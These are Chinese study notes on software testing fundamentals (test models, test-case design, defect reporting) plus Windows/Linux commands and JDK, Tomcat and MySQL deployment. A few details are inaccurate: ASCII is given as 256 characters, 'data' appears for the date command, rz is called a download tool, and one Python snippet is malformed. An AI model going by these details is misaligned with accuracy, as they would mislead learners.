# 基础知识

1. 二、十进制互换

   1. 二转十:

      - 从二进制数的**最右边**开始，将每个位上的数字乘以 2 的幂，幂值从 0 开始递增。将得到的乘积相加，即可得到十进制数的值。如，将二进制数 1101 转换为十进制数： 1 * 2^3^+ 1 * 2^2^ + 0 * 2^1^ + 1 * 2^0^ = 13

        ```python
        bin(十进制数(.)(.) 0b开头的二进制数
        ```

   2. 十转二:

      1. 用 2 除以该数，记录余数。将商作为新的被除数，再次用 2 除以该数，继续记录余数。重复上述步骤，直到商为 0 为止。将记录的余数按照从下到上的顺序排列，即得到二进制数。

         - 例如，将十进制数 26 转换为二进制数： 26 ÷ 2 = 13 余 0 13 ÷ 2 = 6 余 1 6 ÷ 2 = 3 余 0 3 ÷ 2 = 1 余 1 1 ÷ 2 = 0 余 1;余数从下到上排列为 11010，即为 26 的二进制表示。

           ```python
           int('数值字符串',进制数) → 指定进制转换后的十进制数
           ```

2. 测试用例和自动化的比例一般为<font size="3" color="red">20%~40%</font>

3. IP相关知识

   - 以 <font size="3" color="red">10 开头、172.16-31、192.168 </font>的 地址为局域网
   - <font size="3" color="red">127.0.0.1</font> 回环地址 ，永远指向自己的网卡

4. URL 命名规则

   ```shell
   协议：//ip地址:端口/资源路径?参数名 = 参数值&参数名2 = 参数值2
   ```

   - ==c/s 架构：client-server==
   - ==b/s 架构：browser(浏览器)-server==:一种特殊的cs架构,
   
5. 计算机低层只认 0和1，其称为比特位(bite)，只能表示两种情况，8 个 bit 为一个字节(bytes)

   1. <font color="red">ascii为2^8^=256个(1个字节)</font>
   2. <font size="3" color="red">存储换算2^10^=1024</font>
   3. <font size="3" color="red">端口号为2^16^=65536个</font>

6. 字符集

   ```python
   ascii # 8个比特，256种
   gbk # 中文编码 中文占两个字节
   utf8 # 万国码 中文占三个字节
   字符.encode(字符集) # 编码，将字符串使用指定的字符集编码成字节
   字节.decode(字符集) # 解码，将字节使用指定的字符集解码成字符串
   ```

7. <font size="5" color="red">[测试工程师的面试总结](https://testerhome.com/topics/24874)</font>

8. <font size="5" color="red">[测试工程师面试题](https://blog.csdn.net/weixin_46658581/article/details/119678292)</font>

9. <font size="4" color="red">==命令行相关命令==</font>

   ```shell
   ping 域名/ip -n 数 -w 数值 # 向指定的主机发送网络请求以测试连接,n表示发送几次请求,w表示等待响应的时间
   dir # 显示当前路径下的所有文件
   # 切换盘符
       C: # 切换到C盘符
       D: # 切换到D盘符
   cd path # 切换路径
   ipconfig # 显示当前计算机的网络配置信息。
   systeminfo #  显示有关系统的详细信息
   netstat #  显示网络统计信息和连接状态
   
   # 针对system乱码
   os.system('chcp 65001') # 指定编码格式为65001
   # 杀死进程、程序
   netstat -ano | findstr 端口 # 找到指定端口的pid号
   taskkill /IM cmd.exe /t /f # 杀死cmd.exe程序，并结束其子进程，/t包括子进程，/f强制
   taskkill /pid PID /t /f # 杀死pid的进程
   echo # 打印
   ```

10. <font size="6" color="red">常见端口：**Apache和http** 80;**tomcat 8080；https   443；ssh  22；mysql 3306**</font>

11. 安装jdk

    1. 到[java官网](https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html)下载安装java

    2. 环境变量新建`JAVA_HOME`,值为java的jdk安装路径

    3. 在path环境变量中添加`%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin`

    4. 新建环境变量`CLASSPATH`,值为`%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar`

    5. 在cmd中输入java和javac,出现版本后表示部署成功


## 测试基础

### 观念

- 软件的定义：软件 = 程序+数据结构+文档

  > - 能够完成预定功能和性能的可执行的指令(计算机程序)
  > - 使程序能够适当地操作信息的数据结构
  > - 描述程序的操作和使用文档
- 软件分为硬件系统、操作系统、其他系统软件、应用软件
- 软件危机指在计算机软件开发和维护的过充中所遇到的一系列严重问题

  > 1. 客观原因
  >
  >    1. 软件是逻辑产品，与物理产品加工有很大区别
  >    2. 计算机发展迅速，软件需求规模庞大、数量增加、功能复杂
  >    3. 业务流程不断改造，需求不断变化，维护量增大
  >
  > 2. 主观原因
  >    1. 传统观念还没认识到软件生产需要管理，还没有认识到逻辑产品加工的内在规律和找到恰当的规则，还凝滞在习惯的物理加工思维及管理模式上，而没有适应到逻辑产品的生产中
  > 3. 根本原因：
  >    1. 没有把软件的加工当作工程来管理


- 软件工程：将 **系统化的**、**规范的**、**可度量** 的方法用于软件的开发、运行和维护的过程。促进软件行业从无序到有序，


- <font size="5" color="red">**软件的生命周期：计划、需求、设计、编码、测试、运营、淘汰**</font>
  - 软件研发核心角色：需求分析、软件架构、软件编码、软件测试、上线运营


### 软件模型

#### 研发模型

- <font size="5" color="red">瀑布模型、迭代模型、敏捷模型、螺旋模型</font>

##### 瀑布模型

<img src="测试开发.assets/image-20230801094500925.png" alt="image-20230801094500925" style="zoom: 67%;" />

- 优点：瀑布模型在软件工程中占有重要的地位，它提供了软件开发的基本框架，这个比依靠个人技艺开发软件好得多。它有利于大型软件开发过程中人员的组织、管理、有利于软件开发方法和工具的研究与使用，从而提高了大型软件项目开发的质量和效率。
- 缺点：在软件开发的初级阶段指明软件系统的全部需求是困难的，有时甚至是不现实的。而瀑布模型在需求分析阶段要求客户和系统分析员必须做到这一点才能开展后续的工作。

##### 螺旋模型(迭代)

<img src="测试开发.assets/image-20230801094645424.png" alt="image-20230801094645424" style="zoom:67%;" />

- 核心在于不需要在刚开始的时候就把所有事情都定义的清清楚楚，<font size="3" color="red">特别适合于大型复杂的系统</font>

##### 迭代模型

<img src="测试开发.assets/20230128155457.png" alt="image-20230128155457019" style="zoom:67%;" />

<font size="3" color="red">类似小型的瀑布式项目</font>

- 比较适合较大的软件研发项目，整体研发周期比较长
- 近期需求相对明确
- 未来需求可能受外在因素影响容易变动
- 整个项目分阶段进行，每个阶段只设计和实现这个产品的一部分
- 每个阶段都是一个完整的研发过程
- 每个阶段都在前一个阶段的基础上进行功能的新增迭代

##### 敏捷开发

<img src="测试开发.assets/20230128160256.png" alt="image-20230128160256680" style="zoom:67%;" />

- 以用户的需求进化为核心，采用迭代、循序渐进的方法进行软件开发，主要驱动核心是人。相对于瀑布开发模型，在瀑布的整个开发过程中，要写大量的文档，把需求文档写出来后，开发人员都是根据文档进行开发的，一切以文档为依据；而敏捷开发只写有必要的文档，或尽量少写文档，<font size="3" color="red">注重的是人与人之间，面对面的交流</font>，

- **Scrum 的核心要点**(即所谓的 33355)

  - 三大核心角色：产品负责人 Product Owner(PO)、流程管理员 Scrum Master(SM)、开发团队 Scrum Team

  - 三个工件，产品待办事项 (Product Backlog)(即产品的需求列表)、Sprint 待办事项 (Sprint Backlog)(即本次迭代周期内要完成的任务)、可交付产品增量 (Increment)(即迭代结束后可对外发布的产品功能增量部分)

  - 五大事件，主要包括 Sprint、Sprint Planning Meeting(**规划会议**，确定下一个迭代要实现的目标和内容)、Sprint Daily Standup(**每日站会**)、Sprint Review(迭代期末展开，用来检查本期的成果)、Sprint Retrospective(**回顾总结会**，总结经验与教训，并形成切实可行的改进清单)。

  - 五大价值观。即承诺、专注、开放、尊重、勇气。


  <img src="测试开发.assets/20230128160311-1690854532461-4.png" alt="image-20230128160311794" style="zoom:67%;" /> <img src="测试开发.assets/20230128160324.png" alt="image-20230128160324387" style="zoom: 50%;" />


#### 测试模型

- 软件测试定义：<font size="4" color="red">是以发现故障为目的而执行程序的过程</font>

##### V模型

<img src="测试开发.assets/image-20230801095038554.png" alt="image-20230801095038554" style="zoom: 80%;" />

- V 模型的价值在于它非常明确地标明了测试过程中存在的不同级别，并且清楚地描述了这些测试阶段和开发过程期间各阶段的对应关系。
- 局限性：把测试作为编码之后的最后一个活动，需求分析等前期产生的错误直到后期的验收测试才能发现。
  - 单元定义：C 中指一个函数，Java 中指一个类或者类中的方法，在图形化的软件中，单元一般指 1 个窗口，1 个菜单。


- 优点：

  - 包含了底层测试(单元测试)和高层测试(系统测试)；

  - 清楚的标识了开发和测试的各个阶段；

  - 自上而下逐步求精，每个阶段分工明确，便于整体项目的把控。


- 缺点：

  - 自上而下的顺序导致了，测试工作在编码之后，就导致错误不能及时的进行修改；

  - 实际工作中，需求经常变化，导致 v 模型步骤，反复执行，返工量很大，灵活度较低。　

  - 改良：每个步骤都可以进行小的迭代工作。


##### W模型

![image-20230129104023677](https://woniumd.oss-cn-hangzhou.aliyuncs.com/test/dinghua/20230129104023.png)

- 优点：

  - 开发伴随着整个开发周期，需求和设计同样要测试；

  - 更早的介入测试，可以发现初期的缺陷，修复成本低；

  - 分阶段工作，方便项目整体管理。

- 缺点：

  - 开发和测试依然是线性的关系，需求的变更和调整，依然不方便；


  - <font size="3" color="red">如果没有文档，根本无法执行 w 模型；对于项目组成员的技术要求更高！</font>

##### H模型

![image-20230129104327736](https://woniumd.oss-cn-hangzhou.aliyuncs.com/test/dinghua/20230129104327.png)

- 优点：

  - 开发的 H 模型揭示了软件测试除测试执行外，还有很多工作；
  - 软件测试完全独立，贯穿整个生命周期，且与其他流程并发进行；
  - 软件测试活动可以尽早准备、尽早执行，具有很强的灵活性；
  - 软件测试可以根据被测物的不同而分层次、分阶段、分次序的执行，同时也是可以被迭代的。

- 缺点：
  - 管理型要求高：由于模型很灵活，必须要定义清晰的规则和管理制度，否则测试过程将非常难以管理和控制；
  - 技能要求高：H 模型要求能够很好的定义每个迭代的规模，不能太大也不能太小；
  - 测试就绪点分析困难：测试很多时候，你并不知道测试准备到什么时候是合适的，就绪点在哪里，就绪点的标准是什么，这就对后续的测试执行的启动带来很大困难；
  - 对于整个项目组的人员要求非常高：在很好的规范制度下，大家都能高效的工作，否则容易混乱。例如：你分了一个小的迭代，但是因为人员技能不足，使得无法有效完成，那么整个项目就会受到很大的干扰。

### <font size=10 color="red">质量模型</font>

<img src="测试开发.assets/image-20230801095445305.png" alt="image-20230801095445305" style="zoom:50%;" />

## 测试用例设计

<font size="3" color="red">软件测试四大过程：测试分析-测试设计-测试实现-测试执行</font>

<font size="3" color="red">测试工作四个过程：测试计划-**测试用例**-测试执行-测试报告</font>

测试用例设计：<font size="4" color="red">**为特定的目的而设计的一组测试输入、执行条件和预期结果**</font>

使用测试用例的好处主要体现在以下几个方面：

- 在开始实施测试之前设计好测试用例，可以 **避免盲目测试** 并提高测试效率。
- 测试用例的使用让软件测试的实施 **重点突出，目的明确**。
- 在软件版本更新后只需修正少部分的测试用例便可开展测试工作，降低工作强度，缩短项目周期。
- 功能模块的通用化和复用化使软件易于开发，而测试用例的通用化和复用化则会使软件测试易于开展，并随着测试用例的不断精化，其效率也不断攀升。

<img src="测试开发.assets/image-20230709185345796.png" alt="image-20230709185345796" style="zoom:67%;" />

### 测试用例编写方法

- <font size="3" color="red">等价类、边界值、正交设计、流程图、决策表、状态机</font>、错误推测、破坏性测试

  - <font size="5">等价类</font>
    - <font size="4" color="red">划分原则</font>
      - **在输入条件规定了取值范围或值的个数的情况下，可以确立一个有效等价类和两个无效等价类**
      - **在输入条件规定了输入值的集合或者规定了“必须如何”的条件的情况下，可以确立一个有效等价类和一个无效等价类。**
      - **在输入条件是一个布尔量的情况下，可确定一个有效等价类和一个无效等价类。**
      - **在规定了输入数据的一组值(假定 n 个)，并且程序要对每一个输入值分别处理的情况下，可确立 n 个有效等价类和一个无效等价类。**
      - **在规定了输入数据必须遵守的规则的情况下，可确立一个有效等价类(符合规则)和若干个无效等价类(从不同角度违反规则)。**
      - **在确知已划分的等价类中，各元素在程序处理中的方式不同的情况下，则应再将该等价类进一步划分为更小的等价类。**

    - <font size="3" color="red">编写原则</font>
      - **一个测试用例尽可能覆盖多的有效等价类**
      - **一个测试用例一次只能覆盖一个无效等价类**

  - <font size="5">边界值</font>
    - **min-, min, min+, nor, max-, max, max+**
      - ![image-20230222173808721](https://woniumd.oss-cn-hangzhou.aliyuncs.com/test/dinghua/20230222173808.png)

  - <font size="5">判定表</font>

    -  先列出所要求的 n 个条件，通过 **折半法** 列出决策表，共有 2^n^ 个情况，第一个条件前 2^(n-1)^个填 Y，后面全填 N，第二个条件前 2^(n-2)^个填 Y，后面 2^(n-2)^个填 N，然后循环.....

    -  条件过多时需要根据使用情况进行合并。但测试用例并不代表也可以合并

    - <img src="https://woniumd.oss-cn-hangzhou.aliyuncs.com/test/dinghua/20230223172803.png" alt="image-20230223172803109" style="zoom:50%;" />


  - <font size="5">场景法</font>

    - <img src="https://woniumd.oss-cn-hangzhou.aliyuncs.com/test/dinghua/20230228092536.jpg" alt="v2-d5b7e009725f26cb3cd1b42876bc548c_r" style="zoom:33%;" />


  -  <font size="5">正交设计(正交实验)</font>

    - 正交实验助手 pict


    - pict33.msi
    
    - ```shell
      # 打开cmd窗口，进入PICT的目录
      C:\Program Files (x86)\PICT
      # 准备源文件。条件：条件项1，条件项2  (冒号和逗号为英文状态下输入)
      # 执行命令
      pict test1.txt > result.txt           # 生成的结果为txt文档，用记事本打开
      pict test1.txt > result.xls           # 生成的结果为xls文档，用excel打开
      ```


  -  <font size="5">状态迁移</font>


  - **状态迁移图测试步骤**：明确状态节点——绘制状态迁移图——绘制状态迁移树——抽取路径设计用例

    - 迁移图

    - <img src="https://woniumd.oss-cn-hangzhou.aliyuncs.com/test/dinghua/20230301143449.png" alt="image-20230301143449527" style="zoom:50%;" />

    - 迁移树/状态机
      - <img src="https://woniumd.oss-cn-hangzhou.aliyuncs.com/test/dinghua/20230301144018.png" alt="image-20230301144018814" style="zoom:50%;" />


  -  错误推测
     - 据经验或直觉推测程序中可能存在的各种错误，从而有针对性地编写检查这些错误的测试用例的方法。


  - 破坏性测试

    1. 通过浏览器修改 html 代码

    2. 通过接口的方式输入一些页面不允许出现的输入，突破页面上的限制

    3. 通过利用 html 标签执行我们自己的恶意代码(xss)

  - <font size="5" color="red">总结</font>

    - 等价类、边界值通常用于单个输入框

    - 正交设计、判定表通常用于输入框的组合

    - 流程图、状态机通常用于整个的业务流程和状态变化

    - 错误推测和破坏性测试用于随机测试

    - 测试项目时优先考虑场景方法，然后关注模块或功能之间的关系和状态变化，最后使用等价、边界、决策表和正交设计来设计测试用例。用例优先考虑基本流程和一些替代方案 Flows 然后考虑核心功能，最后考虑有效等价类


## 缺陷

- 越是研发的后期，缺陷修复的成本越高

- <font size="5" color="red">**所有发现的 bug 必须记录下来**</font>

- 发现 bug 后如何修改，得咨询一下产品经理，以免担责

- 书面和口头都要沟通

- **研发提交测试的时间定好**

- <font size="3" color="red">缺陷的状态</font>

  ![image-20210217220406683](测试开发.assets/20210217220406.png)

- <font size="5" color="red">**回归测试的目的是 bug 是否真正修复以及是否发生修复 bug 产生更多 bug 的情况**</font>

### 缺陷的属性

- 缺陷的编号(Bug ID)：唯一标识每个 Bug
- **缺陷的摘要(Summary)：简明扼要的描述这个缺陷的信息(一句话把 bug 描述清楚)**
- 可再现性(Reproducible)：这个 Bug 是否是可以重现的(Y/N)
- **复现步骤(Steps)：如果这个 Bug 是由某个用例发现的，则步骤就是该条测试用例的步骤**
- **预期结果(Expected Result)：如果是带有 UI(User Interface)的软件，必须描述 UI 上的呈现效果；如果是涉及协议层面的，必须描述协议层面的信息(比如 Http 协议请求报文、响应报文)；如果是涉及后台服务的，必须描述服务端的变更(比如 DB 表里的记录发生的变更)；**
- **实际结果(Actual Result)：描述该缺陷所对应的和预期结果不符的实际结果，包括 UI、协议、后端各个层面的不同；**
- <font size="3" color="red">**严重程度：崩溃(Blocker)、严重(Critical)、一般(Major)、次要(Minor)**</font>
- 附件
- <font size="3" color="red">**处理状态：new、open、fixed、closed、reject、duplicated、deferred、reopen**</font>
- 软件版本(version)：这个 Bug 是在对应哪个版本的软件上被发现的
- 缺陷提交人(Finder)：发现这个缺陷的人，大部分时候就是测试工程师去提 Bug
- 环境(Environment)：这个 Bug 是在什么样的环境中被发现的
- 发现阶段：描述这个 Bug 是在什么时候被发现的
- 引入阶段：描述这个 Bug 是在什么时候引入的
- 引入原因：描述由于什么原因导致这个 Bug 产生，比如需求未经评审/设计未考虑周全/算法的逻辑漏洞/测试用例考虑不周全，未覆盖到
- 提交日期(Submit Date)：可以评估测试效率
- 修复日期(Fix Date)：可以评估开发修复效率
- 关闭日期(Close Date)：可以统计缺陷龄期(Defect Age)

### 注意点

1. 缺陷报告编写：遵守 5C 原则：准确、详细、简洁、完整、一致
2. Bug 要 **第一时间记录，提交，转给相应开发人员**
3. 每个 Bug **必须书面有所记录，避免丢失**
4. Bug 描述需完整，包括概要描述(bug 标题)，前提，操作步骤，数据，实际结果，期望结果，便于开发理解并进行模拟重现
5. 必需的测试数据应以文件方式附加在 Bug 上面，**不可截图提供给开发**
6. Bug 描述要客观，**不要使用带有感情色彩的词汇或者符号，如!!! ???等**
7. Bug 描述注意角色的准确性，不要使用你我他人称代词
8. 同一组不同测试尽量采用相同的描述风格
9. 复杂的语言难以描述的操作，可以通过视频，截图等方式补充说明
10. 准确填写 Bug 等级和优先级
11. **Bug 是必然还是偶然出现，准确填写，避免误导开发**
12. **一个用例执行中发现多个 Bug，要分拆提交 Bug**
13. 发现他人负责模块的 Bug，**有义务进行确认，并告知他人**
14. Bug **避免重复提交**
15. Bug 交流的意见要填写在 Bug 的 Comment 块作为历史信息进行保留

## 测试专业术语

- 项目型软件：针对专门的客户进行定制开发。
- 产品型软件：针对<font size="3" color="red">大众需求</font>进行研发。
- 单元测试：测试的早期阶段，**主要专注于代码逻辑的实现**，测试对象为单独的 <font size="3" color="red">API(方法)</font>，其测试目标为保证每一个代码单元被正确实现。通常采用<font size="3" color="red">路径覆盖法</font>来判断测试代码的执行效果。
- 集成测试：测试的中期阶段，主要专注于 API (接口)与 API 之间，或者模块与模块之间，甚至子系统与子系统之间的接口。**测试目的是确保代码单元进行集成后相互之间可以协同工作**
- 系统测试：测试的晚期阶段，主要专注于整个系统进行集成后的整体功能，从一个软件系统层面进行整体测试分析，设计与执行。
- 验收测试：项目型软件通常验收测试由客户方完成
- Alpha 测试： <font size="3" color="red">α 测试，也被称之为“内测”</font>，是专门针对产品型软件的一种测试手段，通常研发团队或邀请部分优质客户来到研发现场对软件进行测试，发现问题及时讨论解决。
- Beta 测试：<font size="3" color="red">专门针对产品型软件</font>的一种测试手段，通常会将已开发完成的软件交付给用户使用，用户不必在研发现场，能正常使用该软件即可，发现问题后向研发团队反馈，对产品进行改进。
- Gamma 测试：产品型软件正式上市发布前的<font size="3" color="red">最后一轮测试</font>，把全体成员扮演成用户的角色来进行测试。
- 白盒测试：<font size="3" color="red">**主要关注代码逻辑**</font>，直接对代码部分进行测试，可以测试代码块，或某一个独立的 API，或者是某个模块均可。通常在<font size="3" color="red">单元测试阶段</font>会更多地使用白盒测试方法。
- 灰盒测试：主要关注接口之间的调用，通常在<font size="3" color="red">集成测试阶段</font>
- 黑盒测试：不关注代码，也不关注接口，而是关注界面
- 基于协议的测试：<font size="3" color="red"> **基于代码的测试通常称之为白盒测试，基于接口的测试通常称之为灰盒测试，基于界面的测试通常称之为黑盒测试，而基于协议的测试其实也是一种偏黑的接口测试**。</font>
- 静态测试：<font size="3" color="red">**不启动被测对象的测试**</font>，比如代码走读(code review)，代码评审，文档评审，需求评审等
- 动态测试：启动被测试对象的测试
- 手工测试：通常用于黑盒测试方法或系统测试阶段。
- 自动化测试：**基于代码或基于接口的测试**
- 冒烟测试：目的是**确认软件基本功能正常，可以进行后续的正式测试工作。<font size="3" color="red">大约需要十分钟至一个小时,尽可能不超过半个小时</font>**
  - 不需要设计测试用例,只需要很少、关于软件正常使用情况下的用例

- 随机测试：<font size="3" color="red">主要是对被测软件的一些重要功能进行复测</font>
- 回归测试：
  - 修改了旧代码后，重新进行测试以确认修改没有引入新的错误或导致其他代码产生错误。
  - 回归测试的策略有两种，一种是完全回归，一种是部分回归。涉及到安全和钱的功能都是完全回归。
- 概要设计：在设计阶段把各项需求转换成相应的体系结构，每一部分是功能明确的模块
- 详细设计：对每个模块要完成的工作进行具体的描述。
- 数据字典：描述数据库设计的文档。

# Linux

- 文件名.bak  <font size="4" color="red">一般为备份文件</font>
- 文件名前加个点号表示隐藏文件

## 命令

```shell
1.root@localhost~
    """
    root: 登录的账户名
    @localhost: 本地服务名称
    ~ 登录用户的家目录
    root 的家目录：/root或~
    普通用户的家目录：/home/用户名
    cd /当前使用的用户名 和 cd ~ 进入的目录是一致的
    '#'为超级管理员提示符，'$'为普通用户
    """
2.pwd # 查看当前目录
3.ctrl+c # 退出当前命令
4.ctrl+a / Home # 行首
5.ctrl+e / end # 行尾
6.ctrl+d / exit # 退出
7.ssh [-p port] 用户名@host # 连接用户
8.ls # 查看当前目录文件信息
	"""
	-a : 查看所有文件,包括隐藏文件
	-l : 以列表形式查看,同ll(但有些系统不支持ll)
	-la : 以列表形式查看文件，包括隐藏文件
		列表查看文件时
		第一列:第一个字母表文件类型,d 表示目录,l 表链接文件,特征是文件后面跟着重定向到另外一个文件，- 表普通文件;后面9个字母每3个表示管理员\用户组\其他用户对应的权限
		第二列:文件个数
		第三列:用户名,表示文件或者目录的拥有者
		第四列:所属组名称
		第五列:文件大小,单位byte
		第六列:最后一次修改时间
		第七列:文件名
	"""
9.chmod [-r] u/g/o/a (+-=) (rwx) 文件目录 # 更改目录权限
	"""
	-r:对该目录及目录下的所有文件进行递归
	u/g/o/a:u表用户,g表用户组,o表其他,a表所有
	+-=:+表增加权限;-表示删除权限;=表示覆盖权限
	rwx:r读,值为4;w为写,值为2;x表执行,值为1
	"""
10.tree 路径 # 以树状图形式显示但当前路径下的所有文件,需按照,yum -y install tree
11.systemctl # 系统命令
	"""
	stop firewalld 关闭防火墙
	start firewalld 开启防火墙
	restart firewalld 重启防火墙
	status firewalld 防火墙状态
	disable firewalld 关闭防火墙自启
	enable firewalld 开启防火墙自启
	"""
12.ip a / ip addr / ifconfig /ipconfig # 查看ip
13.yum -y install 工具名 # 下载并确认安装工具
14.touch 路径 # 创建文件
	`直接文件路径,表示执行该文件`
15.mkdir [-p] # 创建空目录,-p可创建多级空目录
16.rmdir [-p] # 删除空目录,-p可删除多级空目录
17.rm [-f] [-r] # 删除非空目录,-f强制删除,无需确认;-r递归目录;两者同时使用-rf
18.mv # 移动目录或文件,同一位置可实现重命名
19.cp [-r] # 复制文件,-r可复制目录
20.scp -P <local_port> [-r][文件或目录] user@ip -p <remote_port>:[目标路径] # 把文件从一台机器复制到另一台机器上,-r复制目录,-p跟传输端口,默认为22
21.vi/vim # 编辑文件,vim需要安装,yum -y install vim
	"""
	`i/a/o`:进入编辑
	`esc`:退出编辑
	`:q/w/x!`: q退出/w保存/x保存并退出/!强制执行
	`:set nu`: 显示行号
	`:set nonu`: 取消行号
	`/`:可查找文字,按n下一个,N上一个
	`shift+g`:最后一行
	`gg`:首行
	`0`:该行第一个位置
	`dd`:删除当行
	`yy`:复制当行
	`p`:粘贴yy复制的行
	`u`:撤销操作
	"""
22.| # 管道符
23.cat # 查看文件
24.more # 分屏查看文件,空格键或回车键下一页;b键上一页;q退出;/搜索文本;:跳转到指定行;=显示行号
25.tail [-f] [-n 行数] # 从尾部往上读,-n指定行数,默认为10行;-f滚动查看
26.head [-n 行数] # 看开头前几行,默认10行
	head -200 | tail -100 # 可查看文件的100-200行
27.find [目录] [参数] 
	"""
	`-size n[cwbkMG]`: 查找大小为n的文件,后面跟单位。常用的单位有:`c`字节(bytes);`w`:两个字节;`b`:512 字节块;`k`: KB;`M`:MB;`G`:GB
        `-size +n[cwbkMG]`: 查找大小大于n的文件。
        `-size -n[cwbkMG]`: 查找大小小于n的文件
        `find /path/to/directory -size +10k -size -100k` 将查找大小在10KB和100KB之间的文件
    `-name 文件名`:查找符合文件名的文件
	"""
28.grep 条件 [文件] [参数] # 查找包含关键字的行,常用于管道符后,
	"""
	error 错误
	exception 异常
	`-i 忽略大小写`
    `-m  匹配几次后停止匹配`
    `-n  打印出匹配行号`
	"""
29.ps  # 查看运行中的进程信息
	"""
	`ps -ef[-aux]:查看所有进程的详细信息`
		-ef：
            -e 选项显示所有进程，而不仅仅是与当前终端会话关联的进程。
            -f 选项显示详细的进程信息，包括进程的父进程ID、用户、CPU使用情况等。
        -aux（通常在Unix/Linux系统中使用）：
            -a 选项显示所有用户的进程，而不仅仅是当前用户的进程。
            -u 选项显示详细的用户信息，包括用户名、CPU使用情况等。
            -x 选项显示无控制终端的进程，通常是守护进程。
	ps -p <pid>:查看指定进程的详细信息
	ps -aux --sort=-%cpu[-%mem] | head -n 10:按 CPU[内存] 使用率排序并显示前10个进程
	"""
30.netstat # 使用需按照 yum -y install net-tools
	"""
	 -anp/-a 查看所有的网络进程
	 -anp |grep 3306:查看 3306 端口是否被占用
	 `ls -l /proc/进程/cwd 可以找到正在使用该端口的进程文件目录`
	"""
31.kill -9 # 强制杀死进程
32.data # 查看系统日期
33.top # 查看系统资源使用率，实时显示系统中各个进程的资源占用情况。每隔 3 秒变一次,top -n 5输出5次后，自动退出
34.free # 查看系统内存使用情况,-s 3每隔 3 秒查看内存情况
35.tar [选项] [打包后的文件名称.`tar.gz`] [需要打包的文件] -C 指定路径
	"""
	-zcvf(压缩)
	-xzvf(解压缩)
	-xvf(解压缩tar文件)
        z: ge格式 
        c: 创建文件
        v: 列出归档的进程
        f: 生成文件, 必须要`放在最后`
        x: 解压缩 
        -C 可以省略不写, 默认在当前路径下
	"""
36.zip -r [打包后的文件名.zip] [需要打包的文件] # -r 表示递归, 可以打包目录
	unzip 压缩文件 -d 指定路径 # 解压文件
37.sz # 从Linux下载到Windows上,yum -y install lrzsz,xshell专属
38.rz -y  # 从Linux下载到Windows上,yum -y install lrzsz,xshell专属
		# 若上传乱码，可以用-b以二进制进行上传
39.history # 历史操作记录
40.> # 覆盖写入
41.>> # 追加写入
42.echo # 打印
43.rpm # 用于软件包的查询、管理和维护
	"""
	-q:查询已安装的软件包
	-a:查询/验证所有软件包
	-e:清除 (卸载) 软件包,`-e --nodeps`:忽略依赖进行卸载
	 -ivh:`-i`：表示安装(install); `-v`：显示安装进度信息`-h`：表示以哈希标记, 提供一个可视化的进度条的形式显示进度信息
	"""
	whereis:只能用于程序名的搜索，而且只搜索二进制文件(参数-b)，经常用来找自定义安装程序
	which:在 path 指定的路径中找
	who:查看哪些终端连上了 linux
	whoami:查看当前登录用户名
	data:查看系统日期
`部署环境变量:在/etc/profile 文件添加变量代码并保存后,还需要输入source /etc/profile, 重新加载 profile 文件`
44.docker 命令
	"""
	docker pull :安装软件
	docker run -d -p 主机端口：容器端口   --name :配置软件
	docker start 容器id/容器名 `启动该容器`
	docker exec it 容器名字 bash: 进入软件
	docker ps :显示正在运行的 docker 容器,-a显示所有
	"""
```





### Linux文件作用

| ***目录***     | **作用**                                                     |
| -------------- | ------------------------------------------------------------ |
| /              | 表示根目录，是绝对路径                                       |
| .              | 表示当前目录，是相对路径，(可以省略)                         |
| ..             | 表示上一级目录，是相对路径                                   |
| **/etc**       | 目录用来存放所有的系统管理所需要的配置文件和子目录           |
| /root          | root 用户的主目录(家目录)                                    |
| /home/         | 存放普通用户的个人文件                                       |
| /bin           | 存放 Linux 常用的命令                                        |
| /boot          | 存放系统启动时要用到的文件                                   |
| /dev           | 存放 Linux 系统中使用的外部设备                              |
| /sbin          | 存放管理员的系统管理程序                                     |
| /var           | 存放着在不断扩充着的东西，将那些经常被修改的目录放在这个目录下。包括各种日志文件。 |
| /lib           | 存放系统动态链接共享库                                       |
| /mnt           | 可临时将别的外部设备挂接在此目录下                           |
| /proc          | 存在系统内存中的信息                                         |
| **/usr/local** | 用户的应用程序和文件都存放在这个目录下                       |
| /usr/bin       | 系统用户使用的应用程序                                       |
| /tmp           | 存放临时文件的目录                                           |
| **/opt**       | **用户自己安装应用程序和文件都存放在这个目录下, 类似/usr/local** |

## 部署软件

### 部署jdk

```shell
# 1、上传jdk文件并解压缩到/usr/local
# 2、将文件里的java、javac添加执行权限
# 3、配置环境变量
vim /etc/profile

JAVA_HOME=/usr/local/jdk1.8.0_251
JRE_HOME=$JAVA_HOME/jre
CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib/rt.jar
PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin
export JAVA_HOME JRE_HOME CLASSPATH PATH
source /etc/profile
# (`source` 是一个Shell命令，用于在当前Shell会话中执行指定脚本文件，并将其中的命令应用于当前环境。)
# 4、验证jdk是否配置成功，成功输出版本后即部署环境变量成功
java -version
javac -version
```

### 部署tomcat

```shell
# 上传文件到Linux并解压缩，然后执行bin文件里的启动程序
/opt/tomcat/bin/startup.sh
# 关闭防火墙
systemctl stop firewalld
# 访问地址，能正常访问后表示部署成功
http：//(ip)：8080。
# 不成功就去logs文件里的catalina.out查看日志
    # bin文件夹：存放可执行程序
    # conf：存放配置文件
    # lib：库，包，存放的是程序运行所依赖的文件
    # log：存放运行日志，格式一般为.out、.log、.err，通常查找error或exception
    # temp：临时文件
    # webapps：运行程序
    # work：工作目录
# 一台电脑可通过复制多份tomcat文件并修改conf目录下的server.xml文件中关闭端口、连接端口、ajp端口(可选)的端口号,实现一台电脑多个tomcat

# 指定tomcat启动的jdk版本
	# 修改bin目录的catalina.sh，如
	export JAVA_HOME=/usr/local/jdk-11.0.19
	export JRE_HOME=/usr/local/jdk-11.0.19

```

### 安装mysql

```shell
# systemctl stop mysqld
# systemctl disable mysqld 取消自启
# 检查机器上是否有mariadb和mysql
rpm -qa | grep mariadb
rpm -qa| grep mysql
# 如果有，则卸载(搜索出来的结果全都卸载)
rpm -e --nodeps mariadb-libs
rpm -e --nodeps mysql
# 安装依赖包
yum -y install gcc-c++  glibc* glibc.i686 libstdc++*  libstdc++.x86_64  libstdc++.i686 libaio.so.1 libncurses.so.5 perl.x86_64  libaio.x86_64 net-tools.x86_64 libnuma.so.1
# 解压压缩包
